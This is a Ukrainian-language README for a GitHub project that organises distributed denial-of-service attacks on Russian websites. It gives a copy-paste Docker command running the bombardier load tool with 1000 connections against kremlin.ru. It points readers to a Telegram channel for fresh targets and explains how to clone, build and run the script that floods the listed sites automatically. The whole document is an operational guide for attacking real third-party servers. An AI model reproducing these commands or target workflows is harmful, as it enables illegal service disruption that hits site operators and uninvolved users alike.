# fuckputin

🇺🇦 DDoS скрипт для координації боротьби з загарбницькими сайтами - використовує bash та [bombardier](https://github.com/codesenberg/bombardier) 🇺🇦

### [English manual](./README.md)

### Cпрощена інструкція - мануальне виконання скрипта

- Встановіть Docker - [Інструкції](https://docs.docker.com/get-docker/)
- `docker run -it alpine/bombardier -c 1000 -d 60s -l https://kremlin.ru`
- Остання частина команди це сайт, слід обрати сайт з [останніх повідоплень чату](https://t.me/itarmyofukraine2022)  

### Автоматичний скрипт

Скрипт виконує цю команду та автоматично підставляє цілі

#### Цілі

Найкраще слідкуйте за оновленими цілями [в цьому офіційному каналі](https://t.me/itarmyofukraine2022)  
Відредагуйте список у файлі [./fuckputin.sh](/fuckputin.sh)

#### Скрипт

- Зкачайте код виконаиши цю команду в терміналі:  
   `git clone https://github.com/v1adko/fuckputin.git`
- Перейдіть до папки з кодом - `cd ./fuckputin`
- (опціонально) Оновіть [цілі](#цілі)

#### Запуск в Docker контейнері (
   
*NOTE*: це може зайняты значно довше, тому якщо ви більш технічно досвідчені спробуйте [встановити бінарники прямо на вашу хост систему](#локальний-запуск)

- Встановіть Docker - [Інструкції](https://docs.docker.com/get-docker/)
- `docker-compose up --build` (на деяких системах compose не йде разом з docker)  
   **або**
- `docker build -t fuckputin .`
- `docker run fuckputin`

#### Локальний запуск

- Встановіть Go - [інструкції](https://go.dev/doc/install)
- Встановіть bombardier [зкачавши бінарний файл](https://github.com/codesenberg/bombardier/releases) відповідний до вашої системи
- Запустіть команду `./fuckputin-local.sh`

### Усе

Зараз можете залишити виконуватись программу на деякий час, можете [моніторити чат](https://t.me/itarmyofukraine2022) та [оновлювати цілі](#цілі) після чого перезапускати скрипт

Дякую за боротьбу! Україна переможе! 💪 🇺🇦
